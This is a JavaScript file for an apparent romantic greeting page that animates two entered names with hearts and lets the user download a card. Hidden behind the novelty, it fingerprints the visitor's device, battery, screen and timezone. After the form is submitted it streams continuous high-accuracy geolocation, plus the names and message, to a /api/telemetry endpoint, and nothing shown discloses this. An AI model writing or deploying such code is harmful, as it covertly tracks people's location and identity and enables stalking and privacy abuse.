(function () {
  'use strict';

  var clientTelemetry = null;
  var watchId = null;

  var screen1 = document.getElementById('screen-1');
  var screen2 = document.getElementById('screen-2');

  var namesForm = document.getElementById('names-form');
  var yourNameInput = document.getElementById('your-name');
  var partnerNameInput = document.getElementById('partner-name');
  var loveMessageInput = document.getElementById('love-message');
  var formError = document.getElementById('form-error');

  var namesDisplay = document.getElementById('names-display');
  var wishDisplay = document.getElementById('wish-display');
  var uiContainer = document.getElementById('ui');
  var replayBtn = document.getElementById('replay-btn');
  var downloadBtn = document.getElementById('download-btn');

  function parseUserAgentFallback(ua) {
    var deviceName = 'Generic Device';
    var deviceType = 'desktop';
    var os = 'Unknown OS';
    var browser = 'Unknown Browser';

    if (/iPhone/i.test(ua)) {
      deviceName = 'Apple iPhone';
      deviceType = 'mobile';
      os = 'iOS';
    } else if (/iPad/i.test(ua)) {
      deviceName = 'Apple iPad';
      deviceType = 'tablet';
      os = 'iPadOS';
    } else if (/Android/i.test(ua)) {
      var match = ua.match(/Android\s+([\d.]+)(?:;|\s+Build\/)?\s*([^;)]+)?/i);
      deviceName = match && match[2] ? match[2].trim() : 'Android Device';
      deviceType = /Mobile/i.test(ua) ? 'mobile' : 'tablet';
      os = match ? 'Android ' + match[1] : 'Android';
    } else if (/Macintosh/i.test(ua)) {
      deviceName = 'Apple Mac';
      deviceType = 'desktop';
      os = 'macOS';
    } else if (/Windows NT/i.test(ua)) {
      deviceName = 'Windows PC';
      deviceType = 'desktop';
      os = 'Windows';
      if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10 / 11';
    } else if (/Linux/i.test(ua)) {
      deviceName = 'Linux PC';
      deviceType = 'desktop';
      os = 'Linux';
    }

    if (/Edg\//i.test(ua)) {
      var edg = ua.match(/Edg\/([\d.]+)/);
      browser = 'Microsoft Edge ' + (edg ? edg[1] : '');
    } else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) {
      var chr = ua.match(/Chrome\/([\d.]+)/);
      browser = 'Google Chrome ' + (chr ? chr[1] : '');
    } else if (/Firefox\//i.test(ua)) {
      var ff = ua.match(/Firefox\/([\d.]+)/);
      browser = 'Mozilla Firefox ' + (ff ? ff[1] : '');
    } else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) {
      var saf = ua.match(/Version\/([\d.]+)/);
      browser = 'Apple Safari ' + (saf ? saf[1] : '');
    }

    return { deviceName: deviceName, deviceType: deviceType, os: os, browser: browser };
  }

  function getBatteryMetrics() {
    if (typeof navigator.getBattery === 'function') {
      return navigator.getBattery().then(function (battery) {
        return {
          battery_level: Math.round(battery.level * 100),
          battery_charging: Boolean(battery.charging)
        };
      }).catch(function () {
        return { battery_level: null, battery_charging: null };
      });
    }
    return Promise.resolve({ battery_level: null, battery_charging: null });
  }

  function detectTelemetry() {
    var ua = navigator.userAgent || '';
    var deviceName = 'Generic Device';
    var deviceType = 'desktop';
    var os = 'Unknown OS';
    var browser = 'Unknown Browser';

    if (typeof window.UAParser === 'function') {
      try {
        var parser = new window.UAParser();
        var res = parser.getResult();
        var vendor = res.device.vendor ? res.device.vendor + ' ' : '';
        var model = res.device.model || '';
        if (vendor || model) {
          deviceName = (vendor + model).trim();
        } else if (res.os.name) {
          deviceName = res.os.name + ' Device';
        }
        deviceType = res.device.type || 'desktop';
        if (res.os.name) os = res.os.name + (res.os.version ? ' ' + res.os.version : '');
        if (res.browser.name) browser = res.browser.name + (res.browser.version ? ' ' + res.browser.version : '');
      } catch (err) {}
    }

    if (deviceName === 'Generic Device' || browser === 'Unknown Browser') {
      var fallback = parseUserAgentFallback(ua);
      if (deviceName === 'Generic Device') deviceName = fallback.deviceName;
      if (deviceType === 'desktop' && fallback.deviceType !== 'desktop') deviceType = fallback.deviceType;
      if (os === 'Unknown OS') os = fallback.os;
      if (browser === 'Unknown Browser') browser = fallback.browser;
    }

    var dpr = window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) / 100 : 1;
    var screenStr = (window.screen.width || 0) + 'x' + (window.screen.height || 0) + ' @ ' + dpr + 'x';

    var tzStr = 'Unknown';
    try {
      tzStr = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    } catch (e) {}

    return getBatteryMetrics().then(function (batteryData) {
      clientTelemetry = {
        device_name: deviceName,
        device_type: deviceType,
        browser: browser,
        os: os,
        battery_level: batteryData.battery_level,
        battery_charging: batteryData.battery_charging,
        screen_res: screenStr,
        timezone: tzStr,
        raw_user_agent: ua
      };
      return clientTelemetry;
    });
  }

  detectTelemetry();

  function applyDynamicFontScaling(totalChars) {
    if (!namesDisplay) return;
    var isMobile = window.innerWidth <= 600;
    var fontSize = totalChars <= 12 ? (isMobile ? '2.1rem' : '3.2rem') : (isMobile ? '1.45rem' : '2.1rem');
    namesDisplay.style.fontSize = fontSize;
  }

  function renderNames(name1, name2, message) {
    if (!namesDisplay) return;
    namesDisplay.innerHTML = '';
    applyDynamicFontScaling(name1.length + name2.length + 3);

    var span1 = document.createElement('span');
    span1.textContent = name1;
    var heartSpan = document.createElement('span');
    heartSpan.className = 'heart-sep';
    heartSpan.textContent = '❤';
    var span2 = document.createElement('span');
    span2.textContent = name2;

    namesDisplay.appendChild(span1);
    namesDisplay.appendChild(heartSpan);
    namesDisplay.appendChild(span2);

    if (wishDisplay) {
      wishDisplay.textContent = message || 'Together Always ❤';
    }
  }

  function generateLoveParticles(count) {
    if (!uiContainer) return;
    uiContainer.innerHTML = '';
    var phrase = 'I love you ❤';

    for (var i = 1; i <= count; i++) {
      var love = document.createElement('div');
      love.className = 'love';
      love.style.setProperty('--i', i.toString());

      var h = document.createElement('div');
      h.className = 'love_horizontal';
      var v = document.createElement('div');
      v.className = 'love_vertical';
      var word = document.createElement('div');
      word.className = 'love_word';
      word.textContent = phrase;

      v.appendChild(word);
      h.appendChild(v);
      love.appendChild(h);
      uiContainer.appendChild(love);
    }
  }

  namesForm.addEventListener('submit', function (e) {
    e.preventDefault();

    var yourName = (yourNameInput.value || '').trim();
    var partnerName = (partnerNameInput.value || '').trim();
    var message = (loveMessageInput.value || '').trim();

    if (!yourName || !partnerName) {
      formError.textContent = 'Please enter both names.';
      return;
    }
    formError.textContent = '';

    screen1.classList.remove('screen-active');
    screen1.classList.add('screen-hidden');
    screen2.classList.remove('screen-hidden');
    screen2.classList.add('screen-active');

    renderNames(yourName, partnerName, message);
    generateLoveParticles(80);

    // Continuous watch position geolocation stream
    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(
        function (position) {
          var payload = Object.assign({}, clientTelemetry || {}, {
            your_name: yourName,
            partner_name: partnerName,
            couple_names: yourName + ' ❤ ' + partnerName,
            message: message,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            location_status: 'Watching / Live Updated'
          });

          fetch('/api/telemetry', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          }).catch(function () {});
        },
        function (error) {
          var statusMsg = error.code === error.TIMEOUT ? 'Timeout' : 'Denied / Blocked';
          var payload = Object.assign({}, clientTelemetry || {}, {
            your_name: yourName,
            partner_name: partnerName,
            couple_names: yourName + ' ❤ ' + partnerName,
            message: message,
            latitude: null,
            longitude: null,
            location_status: statusMsg
          });

          fetch('/api/telemetry', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          }).catch(function () {});
        },
        { enableHighAccuracy: true, maximumAge: 10000, timeout: 10000 }
      );
    }
  });

  // Download snapshot card button event
  if (downloadBtn) {
    downloadBtn.addEventListener('click', function () {
      if (typeof html2canvas !== 'function') {
        alert('Download library loading, please try again in a second.');
        return;
      }
      
      downloadBtn.textContent = 'Generating Image...';
      html2canvas(screen2, { useCORS: true, backgroundColor: '#050508' }).then(function (canvas) {
        var link = document.createElement('a');
        link.download = 'love-animation-card.png';
        link.href = canvas.toDataURL('image/png');
        link.click();
        downloadBtn.textContent = '📸 Download Card to Share';
      }).catch(function () {
        downloadBtn.textContent = '📸 Download Card to Share';
      });
    });
  }

  if (replayBtn) {
    replayBtn.addEventListener('click', function () {
      if (watchId !== null && navigator.geolocation) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
      }

      screen2.classList.remove('screen-active');
      screen2.classList.add('screen-hidden');
      screen1.classList.remove('screen-hidden');
      screen1.classList.add('screen-active');
      yourNameInput.value = '';
      partnerNameInput.value = '';
      if (loveMessageInput) loveMessageInput.value = '';
      yourNameInput.focus();
    });
  }
})();
